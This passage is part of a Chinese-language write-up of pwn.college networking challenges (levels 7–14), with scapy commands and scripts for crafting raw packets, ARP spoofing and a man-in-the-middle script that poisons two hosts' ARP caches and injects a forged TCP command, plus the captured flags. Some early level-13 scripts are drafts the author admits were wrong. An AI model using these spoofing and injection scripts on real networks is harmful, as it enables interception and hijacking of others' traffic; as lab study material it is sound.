+15:07:21.562843 eth0  Out IP 10.0.0.2.31337 &gt; 10.0.0.4.37984: Flags [R.], seq 0, ack 1279607759, win 0, length 0
+15:07:21.639815 lo    In  IP localhost.53883 &gt; 127.0.0.11.domain: 51406+ PTR? 2.0.0.10.in-addr.arpa. (39)
+15:07:21.639846 lo    In  IP 127.0.0.11 &gt; localhost: ICMP 127.0.0.11 udp port domain unreachable, length 75
+15:07:21.639911 lo    In  IP localhost.39242 &gt; 127.0.0.11.domain: 51406+ PTR? 2.0.0.10.in-addr.arpa. (39)
+15:07:21.639923 lo    In  IP 127.0.0.11 &gt; localhost: ICMP 127.0.0.11 udp port domain unreachable, length 75
+15:07:21.640042 lo    In  IP localhost.46035 &gt; 127.0.0.11.domain: 13917+ PTR? 4.0.0.10.in-addr.arpa. (39)
+15:07:21.640052 lo    In  IP 127.0.0.11 &gt; localhost: ICMP 127.0.0.11 udp port domain unreachable, length 75
+15:07:21.640103 lo    In  IP localhost.50224 &gt; 127.0.0.11.domain: 13917+ PTR? 4.0.0.10.in-addr.arpa. (39)
+</code></pre> <p>这个R说明reset位：​​​​​​ 表示TCP连接中出现异常必须强制断开连接。例如，一个没有被使用的端口即使发来了连接请求，也无法通信。</p> <p>然后监听即可</p> <pre><code>nc -l 31337
+</code></pre> <p><em>这题看了讲解才会，就卡在不知道怎么看这个标志位上，果然知识处处是盲区</em></p> <p>然后在你监听以后，就会变成PUSH标志位。</p> <p>///@TODO: 关于后面的发包，我所有ARP啥的基本上都是发送的广播地址，讲解之中发送给特定地址，没有必要，而且由于我有的关卡住，如果发送给特定的物理网卡，我每次重开挑战都要重新查看，有点儿麻烦。</p> <h2 id=level8-manually-send-an-ethernet-packet>level8 Manually send an Ethernet packet</h2> <p>主要是使用scapy</p> <pre><code>&gt;&gt;&gt; sendp(Ether(src=&quot;4a:b3:c7:c5:08:7d&quot;,dst=&quot;ff:ff:ff:ff:ff:ff&quot;,type=0xFFFF),iface=&quot;eth0&quot;)
+.
+Sent 1 packets.
+
+pwn.college{wl9Wr84duLuF_XsCsoo6EiqhnU3.dZjNzMDL2QjMyMzW}
+</code></pre> <h2 id=level9-manually-send-an-internet-protocol-packet>level9 Manually send an Internet Protocol packet</h2> <p>发IP了</p> <pre><code>&gt;&gt;&gt; sendp(Ether(src=&quot;52:bc:a3:08:14:d1&quot;,dst=&quot;ff:ff:ff:ff:ff:ff&quot;, type=0x0800) / IP(proto=0xFF, src=&quot;127.0.0.1&quot;,dst=&quot;10.0.0.3&quot;), iface=&quot;eth0&quot;)
+.
+Sent 1 packets.
+
+pwn.college{c5HrfavanBMm_0po-E47NuCoY2J.ddjNzMDL2QjMyMzW}
+
+</code></pre> <h2 id=level10-manually-send-a-transmission-control-protocol-packet>level10 Manually send a Transmission Control Protocol packet</h2> <pre><code>&gt;&gt;&gt; sendp(Ether(src=&quot;12:af:41:92:01:6f&quot;,dst=&quot;ff:ff:ff:ff:ff:ff&quot;, type=0x0800) / IP(src=&quot;127.0.0.1&quot;, dst=&quot;10.0.0.3&quot;, proto=0x06) / TCP(sport=31337, dport=31337, seq=31337, ack=31337, flags=&quot;APRSF&quot;),
+...: iface=&quot;eth0&quot;)
+.
+Sent 1 packets.
+
+pwn.college{gSJcnHgB4dNz17jCCuEduVjMEF_.dhjNzMDL2QjMyMzW}
+
+
+</code></pre> <h2 id=level11-manually-perform-a-transmission-control-protocol-handshake>level11 Manually perform a Transmission Control Protocol handshake</h2> <pre><code>sendp(Ether(src=get_if_hwaddr(&quot;eth0&quot;),dst=&quot;ff:ff:ff:ff:ff:ff&quot;) / IP(src=&quot;10.0.0.2&quot;, dst=&quot;10.0.0.3&quot;) / TCP(sport=31337, dport=31337, seq=31337, flags=&quot;S&quot;),iface=&quot;eth0&quot;)
+
+sendp(Ether(src=get_if_hwaddr(&quot;eth0&quot;),dst=&quot;ff:ff:ff:ff:ff:ff&quot;) / IP(src=&quot;10.0.0.2&quot;, dst=&quot;10.0.0.3&quot;) / TCP(sport=31337, dport=31337, ack=1235161237, seq=31338,flags=&quot;A&quot;),iface=&quot;eth0&quot;)
+
+pwn.college{cMG0JWm3rTQmJHtfC-JNorRv6Ef.dljNzMDL2QjMyMzW}
+</code></pre> <p>多么美妙的一张图 <img alt=level11 src=../image.png></p> <h2 id=level12-manually-send-an-address-resolution-protocol-packet>level12 Manually send an Address Resolution Protocol packet</h2> <pre><code>&gt;&gt;&gt; sendp(Ether(dst=&quot;ff:ff:ff:ff:ff:ff&quot;, src=get_if_hwaddr(&quot;eth0&quot;)) / ARP(op=&quot;is-at&quot;, hwsrc=get_if_h
+...: waddr(&quot;eth0&quot;), psrc=&quot;10.0.0.2&quot;, hwdst=&quot;ff:ff:ff:ff:ff:ff&quot;, pdst=&quot;10.0.0.3&quot;), iface=&quot;eth0&quot;)
+.
+Sent 1 packets.
+
+pwn.college{0mowkGco5uatE6V9v8I1lPZ2xHa.dBzNzMDL2QjMyMzW}
+</code></pre> <h2 id=level13-hijack-traffic-from-a-remote-host-using-arp>level13 Hijack traffic from a remote host using ARP</h2> <p>先观察一波</p> <pre><code>root@ip-10-0-0-3:~# ip a
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host
+       valid_lft forever preferred_lft forever
+5: eth0@if6: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default qlen 1000
+    link/ether e6:19:83:95:20:c7 brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet 10.0.0.3/16 scope global eth0
+       valid_lft forever preferred_lft forever
+    inet6 fe80::e419:83ff:fe95:20c7/64 scope link
+       valid_lft forever preferred_lft forever
+root@ip-10-0-0-3:~#
+</code></pre> <p>很尬，就自己瞎做把</p> <pre><code>arp_request = Ether(dst=&quot;ff:ff:ff:ff:ff:ff&quot;) / ARP(op=&quot;who-has&quot;, hwsrc=&quot;e6:19:83:95:20:c7&quot;, psrc=&quot;10.0.0.3&quot;, pdst=&quot;10.0.0.4&quot;)
+remote_mac = arp_response[0][1].hwsrc
+</code></pre> <p><img alt=level13 src=../image-1.png></p> <pre><code>tcp_redirect = Ether(src=remote_mac, dst=&quot;e6:19:83:95:20:c7&quot;) / IP(src=&quot;10.0.0.4&quot;, dst=&quot;10.0.0.3&quot;) / TCP(sport=31337, dport=31337, flags=&quot;PA&quot;, seq=123456, ack=0)
+</code></pre> <p><img alt=level13 src=../image-2.png></p> <pre><code>arp_request = Ether(dst=&quot;ff:ff:ff:ff:ff:ff&quot;) / ARP(op=&quot;who-has&quot;, hwsrc=&quot;e6:19:83:95:20:c7&quot;, psrc=&quot;10.0.0.3&quot;, pdst=&quot;10.0.0.2&quot;)
+remote_mac = arp_response[0][1].hwsrc
+</code></pre> <p><img alt="Alt text" src=../image-3.png></p> <pre><code>tcp_redirect = Ether(src=remote_mac, dst=local_mac) / IP(src=&quot;10.0.0.4&quot;, dst=local_ip) / TCP(sport=31338, dport=31337, flags=&quot;PA&quot;, seq=123456, ack=0)
+</code></pre> <p><img alt=level13 src=../image-4.png> 看起来，又是建立链接？</p> <pre><code>sendp(Ether(src=get_if_hwaddr(&quot;eth0&quot;),dst=&quot;ff:ff:ff:ff:ff:ff&quot;) / IP(src=&quot;10.0.0.2&quot;, dst=&quot;10.0.0.3&quot;) / TCP(sport=31337, dport=31337, seq=31337, flags=&quot;A&quot;),iface=&quot;eth0&quot;)
+</code></pre> <p><strong>过程都写完了，可以写脚本了</strong></p> <pre><code class=language-10.0.0.4>from scapy.all import *
+
+# 获取本地接口的 MAC 和 IP 地址
+local_mac = get_if_hwaddr(&quot;eth0&quot;)
+local_ip = get_if_addr(&quot;eth0&quot;)
+
+# 构造 ARP 请求数据包，欺骗目标主机
+arp_request = Ether(dst=&quot;ff:ff:ff:ff:ff:ff&quot;) / ARP(op=&quot;who-has&quot;, hwsrc=local_mac, psrc=local_ip, pdst=&quot;10.0.0.4&quot;)
+
+# 发送 ARP 请求数据包，并获取目标主机的 MAC 地址
+arp_response = srp(arp_request, timeout=2, iface=&quot;eth0&quot;, verbose=False)[0]
+remote_mac = arp_response[0][1].hwsrc
+
+# 构造 TCP 重定向数据包，将流量重定向到本地主机
+tcp_redirect = Ether(src=remote_mac, dst=local_mac) / IP(src=&quot;10.0.0.4&quot;, dst=local_ip) / TCP(sport=31337, dport=31337, flags=&quot;PA&quot;, seq=123456, ack=0)
+
+# 发送 TCP 重定向数据包，劫持流量
+sendp(tcp_redirect, iface=&quot;eth0&quot;)
+</code></pre> <pre><code class=language-10.0.0.2>from scapy.all import *
+
+# 获取本地接口的 MAC 和 IP 地址
+local_mac = get_if_hwaddr(&quot;eth0&quot;)
+local_ip = get_if_addr(&quot;eth0&quot;)
+
+# 构造 ARP 请求数据包，欺骗目标主机
+arp_request = Ether(dst=&quot;ff:ff:ff:ff:ff:ff&quot;) / ARP(op=&quot;who-has&quot;, hwsrc=local_mac, psrc=local_ip, pdst=&quot;10.0.0.2&quot;)
+
+# 发送 ARP 请求数据包，并获取目标主机的 MAC 地址
+arp_response = srp(arp_request, timeout=2, iface=&quot;eth0&quot;, verbose=False)[0]
+remote_mac = arp_response[0][1].hwsrc
+
+# 构造 TCP 重定向数据包，将流量重定向到本地主机
+tcp_redirect = Ether(src=remote_mac, dst=local_mac) / IP(src=&quot;10.0.0.2&quot;, dst=local_ip) / TCP(sport=31337, dport=31337, flags=&quot;PA&quot;, seq=123456, ack=0)
+
+# 发送 TCP 重定向数据包，劫持流量
+sendp(tcp_redirect, iface=&quot;eth0&quot;)
+</code></pre> <p><strong>好吧，整了一大堆，然后发现搞错了，没那么复杂，G。。。</strong></p> <p>正确解答如下：</p> <pre><code>root@ip-10-0-0-3:~# arping 10.0.0.4
+ARPING 10.0.0.4
+42 bytes from ce:b6:65:76:0a:83 (10.0.0.4): index=0 time=17.107 usec
+42 bytes from ce:b6:65:76:0a:83 (10.0.0.4): index=1 time=13.761 usec
+^C
+--- 10.0.0.4 statistics ---
+2 packets transmitted, 2 packets received,   0% unanswered (0 extra)
+rtt min/avg/max/std-dev = 0.014/0.015/0.017/0.002 ms
+root@ip-10-0-0-3:~#
+
+sendp(Ether(src=get_if_hwaddr(&quot;eth0&quot;),dst=&quot;ce:b6:65:76:0a:83&quot;) / ARP(op=&quot;is-at&quot;,hwsrc=get_if_hwaddr(&quot;eth0&quot;),psrc=&quot;10.0.0.2&quot;,hwdst=&quot;ce:b6:65:76:0a:83&quot;,pdst=&quot;10.0.0.4&quot;),iface=&quot;eth0&quot;)
+
+pwn.college{cNTaa8AjxVE-lSXY9DgEeXxNMHz.dFzNzMDL2QjMyMzW}
+</code></pre> <p><img alt=level13结果 src=../image-5.png></p> <h2 id=level14-man-in-the-middle-traffic-between-two-remote-hosts-and-inject-extra-traffic>level14 Man-in-the-middle traffic between two remote hosts and inject extra traffic</h2> <p>从讲解来看，这个题的核心是需要加入对话，而不仅仅是监听，因为对话中有一次性密钥，仅仅监听并不管用，重点是抓住窗口期发送包含有FLAG的包。</p> <p>直接写个脚本</p> <pre><code>from scapy.all import *
+
+sendp(Ether(src=get_if_hwaddr(&quot;eth0&quot;)) / ARP(op=&quot;is-at&quot;,hwsrc=get_if_hwaddr(&quot;eth0&quot;),
+            psrc=&quot;10.0.0.3&quot;,pdst=&quot;10.0.0.4&quot;),iface=&quot;eth0&quot;) #tell 10.0.0.4，where 10.0.0.3 it is
+sendp(Ether(src=get_if_hwaddr(&quot;eth0&quot;)) / ARP(op=&quot;is-at&quot;,hwsrc=get_if_hwaddr(&quot;eth0&quot;),
+            psrc=&quot;10.0.0.4&quot;,pdst=&quot;10.0.0.3&quot;),iface=&quot;eth0&quot;) #tell 10.0.0.3，where 10.0.0.4 it is
+
+packet_data = {
+    'key': '',
+    'dst': '',
+    'src': '',
+    'ipdst': '',
+    'ipsrc': '',
+    'ipflags': '',
+    'sport': 0,
+    'dport': 31337,
+    'flags': '',
+    'seq': 0,
+    'ack': 0
+}
+
+def CallBack(packet):
+    if packet.haslayer('TCP'):
+        tcp = packet['TCP']
+        ip = packet['IP']
+        ether = packet['Ethernet']
+        load = tcp.load if hasattr(tcp, 'load') else b''
+
+        if ip.src == '10.0.0.4' and load != b'ECHO\n':
+            packet_data['key'] = load
+
+
+        if ip.src == '10.0.0.3' and load == b'COMMANDS:\nECHO\nFLAG\nCOMMAND:\n':
+            print(&quot;WARNING!!&quot;)
+
+            packet_data.update({
+                'ipdst': ip.src,
+                'ipsrc': ip.dst,
+                'flags': 'PA',
+                'ipflags': ip.flags,
+                'dst': ether.src,
+                'src': ether.dst,
+                'dport': tcp.sport,
+                'sport': tcp.dport,
+                'seq': tcp.ack,
+                'ack': tcp.seq + 29
+            })
+
+            raw_pkt = Raw(load='FLAG\n')
+            (Ether(src=packet_data['src'], dst=packet_data['dst']) /
+             IP(src=packet_data['ipsrc'], dst=packet_data['ipdst'], flags=packet_data['ipflags']) /
+             TCP(dport=packet_data['dport'], sport=packet_data['sport'], seq=packet_data['seq'], ack=packet_data['ack'], flags=packet_data['flags']) /
+             raw_pkt).display()
+
+            sendp(Ether(src=packet_data['src'], dst=packet_data['dst']) /
+                  IP(src=packet_data['ipsrc'], dst=packet_data['ipdst'], flags=packet_data['ipflags']) /
+                  TCP(dport=packet_data['dport'], sport=packet_data['sport'], seq=packet_data['seq'], ack=packet_data['ack'], flags=packet_data['flags']) /
+                  raw_pkt, iface=&quot;eth0&quot;)
+
+sniff(filter=&quot;tcp&quot;, prn=CallBack, iface='eth0', count=100)
+
+
+</code></pre> <p>然后顺利拿到flag</p> <pre><code>pwn.college{A3pb7kfH8On2sOV2_hSlPGWG_P8.dJzNzMDL2QjMyMzW}
+</code></pre> <p>可以看这个<a href="https://youtu.be/nD4IidymLds?list=PL-ymxv0nOtqqW1sDfN6UGUfJTcYqYH9CM&t=194">视频讲解</a> <img alt=level14 src=../image-6.png></p> <p><strong>碎碎念：这个部分其实不太难，重点是学会scapy即可，但是诡异的地方在于必须使用tmux，好像这样才能在一个父线程之下，不然你在另一个shell里面使用python脚本，这个shell里面的tcpdump抓不到东西。这曾经困扰了我很久，别的就没啥了。</strong></p> <hr> <div class=md-source-date> <small> 最后更新: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">July 26, 2023</span> </small> </div> <script src=https://giscus.app/client.js data-repo=PKUFlyingPig/cs-self-learning data-repo-id=R_kgDOGP67ng data-category=Announcements data-category-id=DIC_kwDOGP67ns4COM9Q data-mapping=title data-reactions-enabled=1 data-emit-metadata=0 data-input-position=top data-theme=light_protanopia data-lang=zh-CN data-loading=lazy crossorigin=anonymous async>
+</script> <script>
+    var palette = __get("__palette")
+    if (palette && typeof palette.color === "object") {
+        if (palette.color.scheme === "slate") {
+            const giscus = document.querySelector("script[src*=giscus]")
+            giscus.setAttribute("data-theme", "dark_protanopia")
+        }
+    }
+
+    document.addEventListener("DOMContentLoaded", function () {
+        const ref = document.querySelector("[data-md-component=palette]")
+        ref.addEventListener("change", function () {
+            var palette = __get("__palette")
+            if (palette && typeof palette.color === "object") {
+                const theme = palette.color.scheme === "slate" ? "dark_protanopia" : "light_protanopia"
+                const frame = document.querySelector(".giscus-frame")
+                frame.contentWindow.postMessage({
+                    giscus: { setConfig: { theme } }
+                }, "https://giscus.app")
+            }
+        })
+    })
+</script> </article> </div> </div> <a href=# class="md-top md-icon" data-md-component=top data-md-state=hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12z"/></svg> Back to top </a> </main> <footer class=md-footer> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class=md-footer-copyright> <div class=md-footer-copyright__highlight> Copyright &copy; 2023-present <a href=https://github.com/TephrocactusMYC target=_blank rel="noopener noreferrer">TephrocactusMYC</a> </div> Made with <a href=https://squidfunk.github.io/mkdocs-material/ target=_blank rel=noopener> Material for MkDocs </a> </div> <div class=md-footer-social> <a href=https://tephrocactusmyc.github.io/CTF-CLASS/ target=_blank rel=noopener title=tephrocactusmyc.github.io class=md-footer-social__link> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 496 512"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg> </a> </div> </div> </div> </footer> </div> <div class=md-dialog data-md-component=dialog> <div class="md-dialog__inner md-typeset"></div> </div> <script id=__config type=application/json>{"base": "../..", "features": ["header.autohide", "navigation.tracking", "navigation.top", "search.highlight", "search.share", "search.suggest", "content.code.annotate"], "search": "../../assets/javascripts/workers/search.fcfe8b6d.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\uff0c\\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "Missing", "select.version.title": "Select version"}, "version": null}</script> <script src=../../assets/javascripts/bundle.b1047164.min.js></script> </body> </html>
